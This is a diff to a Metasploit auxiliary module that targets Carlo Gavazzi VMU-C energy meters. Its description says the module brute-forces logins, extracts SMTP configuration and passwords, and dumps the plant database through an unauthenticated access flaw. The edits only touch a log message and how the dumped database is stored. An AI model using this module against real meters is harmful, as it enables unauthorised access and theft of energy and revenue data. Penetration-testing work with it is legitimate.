@@ -15,7 +15,7 @@ class MetasploitModule < Msf::Auxiliary
     super(update_info(info,
       'Name' => 'Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database',
       'Description' => %{
-        This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db . This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.
+        This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db. This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.
       },
       'References' =>
         [
@@ -258,16 +258,12 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     if res && res.code == 200
-      print_status("#{rhost} - dumping EWplant.db")
+      print_status("#{rhost}:#{rport} - dumping EWplant.db")
       print_good("#{rhost}:#{rport} - EWplant.db retrieved successfully!")
-      path = store_loot(
-        'EWplant.db',
-        'SQLite_db/text',
-        rhost,
-        res.body,
-        rport,
-        'Carlo Gavazzi Energy Meter - EWplant.db'
-      )
+      loot_name = 'EWplant.db'
+      loot_type = 'SQLite_db/text'
+      loot_desc = 'Carlo Gavazzi EM - EWplant.db'
+      path = store_loot(loot_name, loot_type, datastore['RHOST'], res.body , loot_desc)
       print_good("#{rhost}:#{rport} - File saved in: #{path}")
     else
       vprint_error("#{rhost}:#{rport} - Failed to retrieve EWplant.db. Set a higher HTTPCLIENTTIMEOUT and try again. Else, check if target is running vulnerable version.?")
